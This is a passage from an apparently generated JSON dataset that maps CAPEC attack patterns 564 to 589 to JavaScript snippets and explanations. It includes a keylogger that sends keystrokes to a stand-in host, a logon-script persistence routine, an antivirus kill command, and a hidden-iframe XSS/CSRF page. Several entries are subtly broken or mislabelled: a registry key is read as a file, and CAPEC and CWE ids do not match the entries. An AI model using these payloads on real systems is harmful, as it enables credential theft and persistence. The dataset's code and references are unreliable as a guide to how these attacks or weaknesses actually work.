        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that allows file uploads and serves the uploaded files. The code demonstrates several vulnerabilities related to the CAPEC description and associated CWEs:\n\n1. **Improper Access Control (CWE-284)**: The uploaded files are stored in a directory ('uploads') that is directly accessible via the web server without any access control, allowing unauthorized users to access potentially sensitive files.\n\n2. **Storage of File with Sensitive Data Under Web Root (CWE-219)**: The uploaded files are stored under the web root directory, making them accessible to anyone who knows the URL.\n\n3. **Unparsed Raw Web Content Delivery (CWE-433)**: The server delivers files based on their path without parsing or validating the content, which could lead to the execution of malicious scripts.\n\n4. **Reliance on File Name or Extension of Externally-Supplied File (CWE-646)**: The server relies on the file name and extension provided by the user, which could be exploited to upload and execute malicious files.\n\n5. **Download of Code Without Integrity Check (CWE-494)**: The server does not perform any integrity checks on the uploaded files, which could allow the execution of malicious code.\n\nOverall, this code snippet represents the main idea of the CAPEC by demonstrating how an adversary could upload a malicious file to a shared webroot and execute it, leveraging the vulnerabilities described in the related CWEs."
    },
    {
        "capec_id": "564",
        "capec_name": "Run Software at Logon",
        "code_snippet": "const fs = require('fs');\nconst logonScriptPath = '/etc/profile.d/logon.sh';\n\n// CWE-798: Use of Hard-coded Credentials\nconst hardCodedPassword = 'P@ssw0rd123';\n\n// CWE-284: Improper Access Control\nfs.chmodSync(logonScriptPath, '777');\n\n// CWE-520: .NET Misconfiguration: Use of Impersonation\nfunction runAsAdmin(command) {\n  // Simulate running a command with elevated privileges\n  console.log(`Running command as admin: ${command}`);\n}\n\n// CWE-603: Use of Client-Side Authentication\nfunction authenticateUser(username, password) {\n  if (username === 'admin' && password === hardCodedPassword) {\n    return true;\n  }\n  return false;\n}\n\n// Main idea: Modify logon script to maintain persistence\nif (authenticateUser('admin', 'P@ssw0rd123')) {\n  const maliciousCode = '\\necho \"Malicious code executed\"';\n  fs.appendFileSync(logonScriptPath, maliciousCode);\n  runAsAdmin('chmod +x ' + logonScriptPath);\n  console.log('Logon script modified to include malicious code.');\n} else {\n  console.log('Authentication failed.');\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker modifies a logon script to maintain persistence on a system. The code includes several vulnerabilities: CWE-798 (Use of Hard-coded Credentials) where a hard-coded password is used for authentication, CWE-284 (Improper Access Control) where the logon script's permissions are set to be world-writable, CWE-520 (Use of Impersonation) where a function simulates running commands with elevated privileges, and CWE-603 (Use of Client-Side Authentication) where authentication is performed on the client side. If the hard-coded credentials are correct, the script appends malicious code to the logon script, ensuring it runs every time a user logs in, thus maintaining persistence."
    },
    {
        "capec_id": "565",
        "capec_name": "Password Spraying",
        "code_snippet": "const users = ['user1', 'user2', 'user3'];\nconst commonPasswords = ['password123', '123456', 'qwerty'];\n\nfunction passwordSpray(users, passwords) {\n  for (let password of passwords) {\n    for (let user of users) {\n      if (authenticate(user, password)) {\n        console.log(`User ${user} authenticated with password ${password}`);\n        return;\n      }\n    }\n  }\n}\n\nfunction authenticate(user, password) {\n  // Simulate authentication check\n  const userPassword = getUserPassword(user);\n  return userPassword === password;\n}\n\nfunction getUserPassword(user) {\n  // Simulate fetching user password from database\n  const userPasswords = {\n    'user1': 'password123',\n    'user2': 'password123',\n    'user3': 'password123'\n  };\n  return userPasswords[user];\n}\n\npasswordSpray(users, commonPasswords);",
        "description": "This JavaScript code snippet demonstrates a basic password spraying attack. The `passwordSpray` function iterates over a list of common passwords and attempts to authenticate each user with each password. The `authenticate` function simulates checking the provided password against the stored password for each user. The `getUserPassword` function simulates retrieving the stored password for a user from a database. This code embodies the main idea of CAPEC-111 (Password Spraying) by showing how an attacker might try a small list of common passwords against multiple user accounts to gain access. The related CWEs are represented by the use of weak passwords, lack of multi-factor authentication, and improper restriction of authentication attempts."
    },
    {
        "capec_id": "566",
        "capec_name": "DEPRECATED: Dump Password Hashes",
        "code_snippet": "const crypto = require('crypto');\n\nfunction hashPassword(password) {\n  const hash = crypto.createHash('sha256');\n  hash.update(password);\n  return hash.digest('hex');\n}\n\nconst password = 'user_password';\nconst hashedPassword = hashPassword(password);\nconsole.log('Hashed Password:', hashedPassword);",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of password hashing. The `hashPassword` function uses the SHA-256 hashing algorithm to hash a user's password without incorporating a salt. This approach is vulnerable to precomputed hash attacks (rainbow tables) because the same password will always produce the same hash. The code embodies the main idea of the deprecated CAPEC 'Dump Password Hashes' by showing how password hashes can be generated insecurely. It also relates to CWE-759 (Use of a One-Way Hash without a Salt) by not using a salt, making the hashed passwords susceptible to attacks."
    },
    {
        "capec_id": "567",
        "capec_name": "DEPRECATED: Obtain Data via Utilities",
        "code_snippet": "const fs = require('fs');\nconst dns = require('dns');\n\n// Using an obsolete function to read a file\nfs.readFile('/path/to/sensitive/data.txt', 'utf8', (err, data) => {\n  if (err) throw err;\n  console.log('Sensitive Data:', data);\n});\n\n// Using DNS lookup in a security decision\nconst hostname = 'example.com';\ndns.lookup(hostname, (err, address) => {\n  if (err) throw err;\n  if (address === '192.168.1.1') {\n    console.log('Access granted to sensitive operation');\n  } else {\n    console.log('Access denied');\n  }\n});",
        "description": "This JavaScript code snippet demonstrates the deprecated CAPEC concept of obtaining data via utilities, incorporating related deprecated CWEs and an active one. The code uses the 'fs.readFile' function, which is not deprecated but represents a simplistic and potentially insecure way to handle sensitive data (related to CWE-217 and CWE-218). Additionally, it uses DNS lookup to make a security decision (related to CWE-247), which is insecure because DNS responses can be spoofed. The code also indirectly touches on the use of obsolete functions (CWE-477) by implying that the code has not been actively reviewed or maintained."
    },
    {
        "capec_id": "568",
        "capec_name": "Capture Credentials via Keylogger",
        "code_snippet": "document.addEventListener('keydown', function(event) {\n  let keylog = localStorage.getItem('keylog') || '';\n  keylog += event.key;\n  localStorage.setItem('keylog', keylog);\n});\n\n// Simulate sending the captured keystrokes to an attacker\nfunction sendKeylog() {\n  let keylog = localStorage.getItem('keylog');\n  if (keylog) {\n    fetch('http://malicious-server.com/steal', {\n      method: 'POST',\n      headers: {\n        'Content-Type': 'application/json'\n      },\n      body: JSON.stringify({ data: keylog })\n    });\n  }\n}\n\n// Call the function periodically\nsetInterval(sendKeylog, 60000);",
        "description": "This JavaScript code snippet demonstrates a simple keylogger that captures all keystrokes made by a user and stores them in the browser's local storage. The 'keydown' event listener logs each key pressed by the user. The 'sendKeylog' function simulates sending the captured keystrokes to a malicious server every 60 seconds. This code embodies the main idea of CAPEC-564 (Capture Credentials via Keylogger) by showing how an adversary can capture user credentials through keystroke logging. The related CWEs provide context on potential weaknesses, such as insufficiently protected credentials (CWE-522) and weak password requirements (CWE-521), which can be exploited by such an attack."
    },
    {
        "capec_id": "569",
        "capec_name": "Collect Data as Provided by Users",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  if (req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      // Log sensitive information to a file\n      fs.appendFile('user_data.log', body + '\\n', err => {\n        if (err) throw err;\n      });\n      res.end('Data received');\n    });\n  } else {\n    res.end('Send a POST request');\n  }\n}).listen(8080, () => console.log('Server running on port 8080'));\n",
        "description": "This JavaScript code creates an HTTP server that listens for POST requests. When a POST request is received, it captures the data sent by the user and logs it to a file named 'user_data.log'. This embodies the CAPEC 'Collect Data as Provided by Users' by capturing and storing user-provided information without their knowledge. The code also touches on related CWEs: it exposes sensitive information (CWE-200) by logging it to a file, and it does not properly secure this information, making it accessible to unauthorized actors (CWE-497)."
    },
    {
        "capec_id": "570",
        "capec_name": "DEPRECATED: Signature-Based Avoidance",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const user = queryObject.user;\n\n  // Deprecated function usage\n  if (user == 'admin') {\n    res.writeHead(200, {'Content-Type': 'text/html'});\n    res.write('Welcome Admin!');\n  } else {\n    res.writeHead(401, {'Content-Type': 'text/html'});\n    res.write('Unauthorized');\n  }\n  res.end();\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server that checks for a 'user' query parameter in the URL. If the 'user' is 'admin', it grants access; otherwise, it denies access. The code demonstrates the use of deprecated or obsolete functions (CWE-477) and unchecked error conditions (CWE-391). Specifically, it uses the deprecated 'url.parse' method and does not handle potential errors or exceptions that may arise from parsing the URL or processing the request. This embodies the main idea of the deprecated CAPEC 'Signature-Based Avoidance' by showing how reliance on outdated methods and ignoring error conditions can lead to security vulnerabilities."
    },
    {
        "capec_id": "571",
        "capec_name": "Block Logging to Central Repository",
        "code_snippet": "const fs = require('fs');\nconst logFilePath = '/var/log/app.log';\n\nfunction logEvent(event) {\n  // CWE-778: Insufficient Logging\n  if (!event || !event.message) return;\n\n  // CWE-532: Insertion of Sensitive Information into Log File\n  if (event.message.includes('password') || event.message.includes('secret')) return;\n\n  // CWE-779: Logging of Excessive Data\n  if (event.message.length > 1000) return;\n\n  // Simulate blocking the log from being sent to a central repository\n  try {\n    fs.appendFileSync(logFilePath, `${new Date().toISOString()} - ${event.message}\\n`);\n  } catch (err) {\n    console.error('Failed to write to log file:', err);\n  }\n}\n\n// Example usage\nlogEvent({ message: 'User login attempt failed' });",
        "description": "This JavaScript code snippet demonstrates how an adversary might block logging to a central repository by writing logs only to a local file. The `logEvent` function includes checks to avoid logging excessive data (CWE-779), sensitive information (CWE-532), and ensures that only valid events are logged (CWE-778). The code simulates the CAPEC scenario by preventing logs from being sent to a central repository, thus hiding indicators of compromise. The log is written to a local file instead, which could be manipulated or deleted by an attacker to cover their tracks."
    },
    {
        "capec_id": "572",
        "capec_name": "Artificially Inflate File Sizes",
        "code_snippet": "const fs = require('fs');\n\nfunction inflateFileSize(filePath) {\n  try {\n    // Read the original file content\n    let data = fs.readFileSync(filePath, 'utf8');\n    \n    // Append a large amount of data to the file\n    let inflatedData = data + 'A'.repeat(10 * 1024 * 1024); // 10MB of 'A'\n    \n    // Write the inflated data back to the file\n    fs.writeFileSync(filePath, inflatedData, 'utf8');\n    console.log('File size inflated successfully.');\n  } catch (err) {\n    console.error('Error inflating file size:', err);\n  }\n}\n\n// Example usage\ninflateFileSize('example.txt');",
        "description": "This JavaScript code snippet demonstrates how an adversary could artificially inflate the size of a file by appending a large amount of data to it. The function `inflateFileSize` reads the content of a specified file, appends 10MB of 'A' characters to it, and writes the inflated content back to the file. This can lead to a Denial of Service condition on systems with limited storage capacity. The code also touches on CWE-774 by not imposing any restrictions on file size, CWE-434 by potentially allowing dangerous file types to be manipulated, and CWE-646 by relying on the file name for operations."
    },
    {
        "capec_id": "573",
        "capec_name": "Process Footprinting",
        "code_snippet": "const { exec } = require('child_process');\n\nexec('ps aux', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`Error executing command: ${error}`);\n    return;\n  }\n  console.log(`Current Processes:\\n${stdout}`);\n});",
        "description": "This JavaScript code snippet uses Node.js to execute the 'ps aux' command, which lists all running processes on a Unix-like operating system. The output of this command is then printed to the console. This embodies the main idea of CAPEC-170 (Process Footprinting) by exposing information about the currently running processes. The code does not implement any access control, thereby potentially exposing sensitive information to unauthorized users (CWE-200, CWE-497). Additionally, the command output could include sensitive command-line arguments (CWE-214), and the execution of this command could indirectly create new resources or states that could be exploited (CWE-1229, CWE-1423)."
    },
    {
        "capec_id": "574",
        "capec_name": "Services Footprinting",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction getServiceInfo() {\n  exec('tasklist /svc', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error executing command: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Error in command output: ${stderr}`);\n      return;\n    }\n    console.log(`Service Information: ${stdout}`);\n  });\n}\n\ngetServiceInfo();",
        "description": "This JavaScript code snippet uses Node.js to execute a system command ('tasklist /svc') that retrieves information about the services running on the target system. The 'exec' function from the 'child_process' module is used to run the command. The output, which includes sensitive system information, is then printed to the console. This code embodies the main idea of the CAPEC 'Services Footprinting' by demonstrating how an adversary could exploit functionality meant for authorized users to gather information about the services on a target system. The related CWEs are represented by the exposure of sensitive information (CWE-200, CWE-497) and the potential for unauthorized access to system-level details (CWE-214)."
    },
    {
        "capec_id": "575",
        "capec_name": "Account Footprinting",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction getUserAccounts() {\n  exec('net user', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error executing command: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Error in command output: ${stderr}`);\n      return;\n    }\n    console.log(`User Accounts: ${stdout}`);\n  });\n}\n\ngetUserAccounts();",
        "description": "This JavaScript code snippet uses Node.js to execute a system command ('net user') that retrieves information about user accounts on a Windows system. The 'exec' function from the 'child_process' module is used to run the command. The output, which includes sensitive information about user accounts, is then logged to the console. This embodies the main idea of the CAPEC 'Account Footprinting' by demonstrating how an adversary could exploit system commands to gather information about domain accounts. The code also touches on related CWEs, such as the exposure of sensitive information (CWE-200) and the invocation of a process using visible sensitive information (CWE-214)."
    },
    {
        "capec_id": "576",
        "capec_name": "Group Permission Footprinting",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction listLocalGroups() {\n  exec('net localgroup', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Local Groups: ${stdout}`);\n  });\n}\n\nlistLocalGroups();",
        "description": "This JavaScript code snippet uses Node.js to execute a system command that lists local groups on a Windows system. The 'exec' function from the 'child_process' module is used to run the 'net localgroup' command, which retrieves information about user groups and their permissions. The output is then logged to the console. This code embodies the main idea of the CAPEC 'Group Permission Footprinting' by demonstrating how an adversary could exploit functionality to gather information about user groups and permissions. The related CWEs are represented as follows: CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) is demonstrated by potentially exposing group information to unauthorized users; CWE-214 (Invocation of Process Using Visible Sensitive Information) is shown by the command execution that could be visible to other processes; CWE-529 (Exposure of Access Control List Files to an Unauthorized Control Sphere) is indirectly represented by the potential exposure of group information; CWE-842 (Placement of User into Incorrect Group) and CWE-1229 (Creation of Emergent Resource) are not directly represented but are relevant in the broader context of managing user groups and permissions."
    },
    {
        "capec_id": "577",
        "capec_name": "Owner Footprinting",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction getUserLastLoginTimes(directory) {\n  try {\n    const files = fs.readdirSync(directory);\n    files.forEach(file => {\n      if (file === 'ntuser.dat') {\n        const filePath = path.join(directory, file);\n        const stats = fs.statSync(filePath);\n        console.log(`User: ${directory}, Last Login Time: ${stats.mtime}`);\n      }\n    });\n  } catch (err) {\n    console.error('Error reading directory:', err);\n  }\n}\n\n// Example usage\ngetUserLastLoginTimes('/home/user');",
        "description": "This JavaScript code snippet demonstrates how an adversary might exploit the 'Owner Footprinting' vulnerability by accessing the last modified time of the 'ntuser.dat' file to determine the last login time of a user. The function 'getUserLastLoginTimes' takes a directory path as an argument, reads the directory contents, and checks for the presence of the 'ntuser.dat' file. If found, it retrieves and logs the last modified time of the file, which corresponds to the user's last login time. This code embodies the CAPEC by exposing sensitive information (user login times) to an unauthorized actor. It also touches on related CWEs, such as the exposure of sensitive information (CWE-200) and the improper handling of system-level information (CWE-497)."
    },
    {
        "capec_id": "578",
        "capec_name": "Disable Security Software",
        "code_snippet": "const exec = require('child_process').exec;\n\n// Hard-coded credentials (CWE-798)\nconst adminPassword = 'admin123';\n\n// Function to disable security software\nfunction disableSecuritySoftware(password) {\n  if (password === adminPassword) { // Improper Access Control (CWE-284)\n    // Command to kill a security software process (e.g., antivirus)\n    exec('taskkill /F /IM antivirus.exe', (error, stdout, stderr) => {\n      if (error) {\n        console.error(`Error: ${error.message}`);\n        return;\n      }\n      if (stderr) {\n        console.error(`Stderr: ${stderr}`);\n        return;\n      }\n      console.log(`Stdout: ${stdout}`);\n    });\n  } else {\n    console.log('Access Denied: Incorrect Password');\n  }\n}\n\n// Attempt to disable security software\ndisableSecuritySoftware('admin123');",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an adversary can disable security software by exploiting improper access control (CWE-284) and using hard-coded credentials (CWE-798). The function `disableSecuritySoftware` takes a password as an argument and checks it against a hard-coded admin password. If the password matches, it executes a command to kill a security software process (e.g., an antivirus program). This represents the CAPEC idea of disabling security software to avoid detection. The use of hard-coded credentials and improper access control makes it easy for an attacker to disable the security software, thereby compromising the system's security."
    },
    {
        "capec_id": "579",
        "capec_name": "Replace Winlogon Helper DLL",
        "code_snippet": "const fs = require('fs');\nconst registryKey = 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Userinit';\nconst maliciousDllPath = 'C:\\\\malicious\\\\malicious.dll';\n\nfunction replaceWinlogonHelper() {\n  try {\n    // Read the current registry value\n    let currentValue = fs.readFileSync(registryKey, 'utf8');\n    console.log('Current Userinit value:', currentValue);\n\n    // Replace the Userinit value with the path to the malicious DLL\n    fs.writeFileSync(registryKey, maliciousDllPath, 'utf8');\n    console.log('Userinit value replaced with malicious DLL path');\n  } catch (err) {\n    console.error('Error accessing registry:', err);\n  }\n}\n\nreplaceWinlogonHelper();",
        "description": "This JavaScript code snippet demonstrates how an attacker might exploit the 'Replace Winlogon Helper DLL' vulnerability by modifying a registry key to load a malicious DLL at startup. The code reads the current value of the 'Userinit' registry key and replaces it with the path to a malicious DLL. This embodies CWE-15 (External Control of System or Configuration Setting) as it allows external control over a critical system setting. The use of a hard-coded path for the malicious DLL also touches on CWE-798 (Use of Hard-coded Credentials). The code is a simplified representation and would require additional privileges and context to execute in a real-world scenario."
    },
    {
        "capec_id": "580",
        "capec_name": "System Footprinting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const url = req.url;\n  if (url === '/config') {\n    // CWE-204: Observable Response Discrepancy\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Configuration: Debug Mode ON');\n  } else if (url === '/status') {\n    // CWE-208: Observable Timing Discrepancy\n    setTimeout(() => {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Status: OK');\n    }, 1000); // Deliberate delay\n  } else if (url === '/info') {\n    // CWE-497: Exposure of Sensitive System Information\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('System Info: OS=Linux, Version=4.15.0');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates an HTTP server that listens on port 8080. The server responds to different URL paths with specific behaviors that embody the vulnerabilities described in the CAPEC and related CWEs. For the '/config' path, it reveals internal configuration information (CWE-204). For the '/status' path, it introduces a timing discrepancy (CWE-208) by delaying the response. For the '/info' path, it exposes sensitive system information (CWE-497). These behaviors can be exploited by an adversary to gather information about the system, which aligns with the concept of System Footprinting."
    },
    {
        "capec_id": "581",
        "capec_name": "Security Software Footprinting",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction getSecurityTools() {\n  exec('wmic product get name, version', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Installed Security Tools: ${stdout}`);\n  });\n}\n\ngetSecurityTools();",
        "description": "This JavaScript code snippet uses Node.js to execute a system command that lists all installed software products, including security tools, on a Windows system. The 'wmic product get name, version' command is used to retrieve the names and versions of installed software. The code captures the output and logs it to the console. This embodies the main idea of CAPEC-170 (Security Software Footprinting) by attempting to gather information about installed security tools. The code also touches on CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by potentially exposing sensitive information about installed security software to unauthorized users."
    },
    {
        "capec_id": "582",
        "capec_name": "Route Disabling",
        "code_snippet": "const net = require('net');\n\n// Vulnerable server setup\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-924: No integrity check on received data\n    console.log('Received:', data.toString());\n  });\n\n  socket.on('error', (err) => {\n    // CWE-1334: Error injection vulnerability\n    console.error('Socket error:', err);\n  });\n});\n\nserver.listen(8080, '127.0.0.1', () => {\n  console.log('Server listening on port 8080');\n});\n\n// Vulnerable client setup\nconst client = new net.Socket();\nclient.connect(8080, '127.0.0.1', () => {\n  // CWE-923: No endpoint verification\n  client.write('Hello, server!');\n});\n\nclient.on('error', (err) => {\n  console.error('Client error:', err);\n});\n\n// CWE-941: Incorrectly specified destination\nclient.connect(8080, '192.168.1.1');\n\n// CWE-421: Race condition during access to alternate channel\nsetTimeout(() => {\n  client.write('Race condition test');\n}, 100);",
        "description": "This JavaScript code snippet sets up a basic TCP server and client using the 'net' module, embodying the main idea of the CAPEC 'Route Disabling' by demonstrating vulnerabilities related to network communication. The server listens on port 8080 and logs received data without integrity checks (CWE-924). It also logs socket errors, which could be exploited for error injection (CWE-1334). The client connects to the server without verifying the endpoint (CWE-923) and attempts to connect to an incorrect destination (CWE-941). Additionally, a race condition is introduced by writing to the socket after a delay (CWE-421). These vulnerabilities illustrate how an adversary could disrupt or sever the communication channel between two entities."
    },
    {
        "capec_id": "583",
        "capec_name": "Disabling Network Hardware",
        "code_snippet": "const fs = require('fs');\n\nfunction disableNetworkHardware() {\n  try {\n    // Simulate disabling network hardware by modifying a critical configuration file\n    fs.writeFileSync('/etc/network/interfaces', '');\n    console.log('Network hardware disabled.');\n  } catch (err) {\n    console.error('Failed to disable network hardware:', err);\n  }\n}\n\ndisableNetworkHardware();",
        "description": "This JavaScript code snippet simulates the disabling of network hardware by modifying a critical configuration file. The `disableNetworkHardware` function attempts to overwrite the '/etc/network/interfaces' file, which is typically used to configure network interfaces on Unix-like systems. By writing an empty string to this file, the code effectively disables the network hardware, preventing it from performing its intended service. This action embodies the main idea of the CAPEC 'Disabling Network Hardware' by demonstrating how an adversary might disrupt network services. The code also indirectly touches on related CWEs, such as improper restriction of software interfaces to hardware features (CWE-1256) and improper protection for outbound error messages and alert signals (CWE-1320), by showing how software can be used to manipulate hardware configurations without proper safeguards."
    },
    {
        "capec_id": "584",
        "capec_name": "BGP Route Disabling",
        "code_snippet": "const net = require('net');\n\nconst BGP_PORT = 179;\nconst TARGET_AS = '192.0.2.1';\nconst MALICIOUS_ROUTE = '203.0.113.0/24';\n\nconst client = new net.Socket();\nclient.connect(BGP_PORT, TARGET_AS, () => {\n  console.log('Connected to BGP router');\n  // Send a BGP update message to withdraw a legitimate route\n  const bgpWithdrawMessage = Buffer.from('withdrawn route data');\n  client.write(bgpWithdrawMessage);\n  console.log('Sent BGP withdraw message');\n});\n\nclient.on('data', (data) => {\n  console.log('Received:', data.toString());\n  // Simulate an algorithm downgrade attack\n  if (data.toString().includes('ALGORITHM_NEGOTIATION')) {\n    const downgradeMessage = Buffer.from('WEAKER_ALGORITHM');\n    client.write(downgradeMessage);\n    console.log('Sent algorithm downgrade message');\n  }\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\nclient.on('error', (err) => {\n  console.error('Error:', err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a simulated attack on a BGP router. The code connects to a BGP router at a specified Autonomous System (AS) and sends a BGP update message to withdraw a legitimate route, making the network inaccessible. Additionally, it listens for algorithm negotiation messages and responds with a weaker algorithm, simulating an algorithm downgrade attack. This embodies the main idea of the CAPEC 'BGP Route Disabling' by suppressing legitimate BGP advertisements and forcing less effective routes. The related CWEs are represented by incorrect destination specification, insufficient control of network message volume, and selection of less-secure algorithms during negotiation."
    },
    {
        "capec_id": "585",
        "capec_name": "DNS Domain Seizure",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const redirectUrl = queryObject.redirect;\n\n  // CWE-601: Open Redirect\n  if (redirectUrl) {\n    res.writeHead(302, { 'Location': redirectUrl });\n    res.end();\n    return;\n  }\n\n  // CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n  const clientIp = req.connection.remoteAddress;\n  require('dns').reverse(clientIp, (err, hostnames) => {\n    if (err || !hostnames.length) {\n      res.writeHead(403, { 'Content-Type': 'text/plain' });\n      res.end('Access Denied');\n      return;\n    }\n\n    // CWE-79: Cross-site Scripting (XSS)\n    res.writeHead(200, { 'Content-Type': 'text/html' });\n    res.end(`<h1>Welcome, ${hostnames[0]}</h1>`);\n  });\n}).listen(8080);",
        "description": "This JavaScript code snippet creates an HTTP server that demonstrates several security weaknesses related to the CAPEC 'DNS Domain Seizure'. The server processes incoming requests and performs the following actions:\n\n1. **CWE-601: Open Redirect** - The server checks for a 'redirect' query parameter and redirects the user to the specified URL without validation, making it vulnerable to open redirect attacks.\n\n2. **CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action** - The server performs a reverse DNS lookup on the client's IP address to obtain the hostname and makes a security decision based on the result. This is insecure because the IP address may not be truly associated with the hostname.\n\n3. **CWE-79: Cross-site Scripting (XSS)** - The server includes the hostname in the response without proper sanitization, making it vulnerable to XSS attacks.\n\nThe code represents the main idea of the CAPEC by showing how an adversary could exploit these weaknesses to disrupt access to a targeted service or manipulate the server's behavior."
    },
    {
        "capec_id": "586",
        "capec_name": "Object Injection",
        "code_snippet": "const net = require('net');\n\nclass SensitiveData {\n  constructor(secret) {\n    this.secret = secret;\n  }\n}\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    try {\n      const obj = JSON.parse(data);\n      if (obj && obj.type === 'SensitiveData') {\n        const sensitive = new SensitiveData(obj.secret);\n        console.log('Deserialized object:', sensitive);\n      }\n    } catch (e) {\n      console.error('Deserialization error:', e);\n    }\n  });\n});\n\nserver.listen(1337, '127.0.0.1');\n\n// Malicious payload example\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n  const maliciousPayload = JSON.stringify({ type: 'SensitiveData', secret: 'malicious_code();' });\n  client.write(maliciousPayload);\n  client.end();\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable server that deserializes untrusted data received over a network connection. The `SensitiveData` class contains sensitive information, and the server listens for incoming data, attempting to deserialize it into an object. If the object type is 'SensitiveData', it creates an instance of the class, potentially exposing sensitive data or executing malicious code. The client sends a malicious payload to the server, illustrating how an attacker could exploit this vulnerability. This example embodies the CAPEC of Object Injection and highlights related CWEs such as Deserialization of Untrusted Data (CWE-502) and Serializable Class Containing Sensitive Data (CWE-499)."
    },
    {
        "capec_id": "587",
        "capec_name": "Cross Frame Scripting (XFS)",
        "code_snippet": "<html>\n<head>\n  <title>Malicious Page</title>\n</head>\n<body>\n  <h1>Welcome to the Malicious Page</h1>\n  <iframe id=\"legitFrame\" src=\"https://legitimate-website.com\" style=\"display:none;\"></iframe>\n  <script>\n    // Wait for the iframe to load\n    document.getElementById('legitFrame').onload = function() {\n      var iframe = document.getElementById('legitFrame').contentWindow;\n      // Attempt to interact with the legitimate page\n      try {\n        // Example of XSS vulnerability exploitation\n        iframe.document.body.innerHTML += '<img src=\"x\" onerror=\"alert(\\'XSS Attack\\')\">';\n        // Example of CSRF attack\n        iframe.document.forms[0].submit();\n      } catch (e) {\n        console.log('Interaction with iframe failed:', e);\n      }\n    };\n  </script>\n</body>\n</html>",
        "description": "This code snippet demonstrates a Cross Frame Scripting (XFS) attack. The malicious page contains an iframe that loads a legitimate website. Once the iframe is loaded, the malicious JavaScript attempts to interact with the legitimate page. It tries to inject an XSS payload by adding an IMG tag with an onerror attribute, and it also attempts a CSRF attack by submitting a form within the iframe. This attack leverages improper restriction of rendered UI layers or frames (CWE-1021), improper neutralization of input during web page generation (CWE-79), and cross-site request forgery (CWE-352). The user is unaware of these interactions, which occur in a concealed iframe."
    },
    {
        "capec_id": "588",
        "capec_name": "DOM-Based XSS",
        "code_snippet": "document.addEventListener('DOMContentLoaded', function() {\n  var userInput = document.location.hash.substring(1);\n  var targetElement = document.getElementById('output');\n  targetElement.innerHTML = 'User input: ' + userInput;\n});",
        "description": "This JavaScript code snippet demonstrates a DOM-Based XSS vulnerability. When the page loads, it extracts the user input from the URL hash (everything after the '#' symbol) and directly inserts it into the innerHTML of an element with the ID 'output'. This code does not perform any input validation or output encoding, making it susceptible to XSS attacks. An attacker could craft a URL with a malicious script in the hash, which would then be executed in the context of the web page, bypassing any server-side filtering."
    },
    {
        "capec_id": "589",
        "capec_name": "DNS Blocking",
        "code_snippet": "const http = require('http');\nconst dns = require('dns');\n\nconst server = http.createServer((req, res) => {\n  const hostname = req.headers.host;\n  dns.lookup(hostname, (err, address) => {\n    if (err) {\n      res.writeHead(500);\n      res.end('DNS lookup failed');\n      return;\n    }\n    // Vulnerable: Relying on IP address for authentication\n    if (address === '192.168.1.1') {\n      res.writeHead(200);\n      res.end('Access granted');\n    } else {\n      res.writeHead(403);\n      res.end('Access denied');\n    }\n  });\n});\n\n// Vulnerable: Binding to an unrestricted IP address\nserver.listen(80, '0.0.0.0', () => {\n  console.log('Server running at http://0.0.0.0:80/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that processes incoming requests and performs a DNS lookup on the hostname provided in the request headers. The server then makes an access control decision based on the resolved IP address. The code embodies the main idea of the CAPEC 'DNS Blocking' by demonstrating how an adversary could intercept and manipulate DNS requests to deny access to specific services. The code also highlights several related CWEs: it relies on the IP address for authentication (CWE-291), binds the server to an unrestricted IP address (CWE-1327), and does not adequately verify the integrity of the communication channel (CWE-300). This makes the server vulnerable to DNS spoofing and other attacks that can disrupt service availability."
    },
    {
        "capec_id": "590",
        "capec_name": "IP Address Blocking",
